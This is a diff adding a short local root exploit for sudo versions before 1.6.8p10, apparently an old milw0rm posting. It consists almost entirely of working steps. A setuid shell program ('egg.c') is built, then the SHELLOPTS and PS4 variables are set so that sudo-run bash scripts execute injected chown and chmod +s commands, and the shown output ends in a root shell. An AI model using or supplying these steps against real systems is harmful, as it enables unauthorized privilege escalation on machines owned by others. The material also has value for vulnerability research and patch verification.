@@ -1,0 +1,52 @@
+## Sudo local root escalation privilege ##
+## vuln versions :  sudo < 1.6.8p10
+## by breno
+
+## You need sudo access execution for some bash script ##
+## Use csh shell to change SHELLOPTS env ##
+
+ie:
+       %cat x.sh
+       #!/bin/bash -x
+
+       echo "Getting root!!"
+       %
+##
+
+##
+       # cat /etc/sudoers
+       ...
+       breno   ALL=(ALL) /home/breno/x.sh
+       ..
+       #
+
+## Let's use an egg shell :)
+       %cat egg.c
+
+#include <stdio.h>
+
+       int main()
+       {
+       setuid(0);
+       system("/bin/sh");
+}
+%
+
+% gcc -o egg egg.c
+% setenv SHELLOPTS xtrace
+% setenv PS4 '$(chown root:root egg)'
+% sudo ./x.sh
+echo Getting root!!
+Getting root!!
+% ls -lisa egg
+1198941 8 -rwxr-xr-x  1 root root 7428 2005-11-09 13:54 egg
+% setenv PS4 '$(chmod +s egg)'
+% sudo ./x.sh
+echo Getting root!!
+Getting root!!
+% ./egg
+sh-3.00# id
+uid=0(root) gid=1000(breno) egid=0(root) grupos=7(lp),102(lpadmin),1000(breno)
+sh-3.00#
+
+# milw0rm.com [2005-11-09]
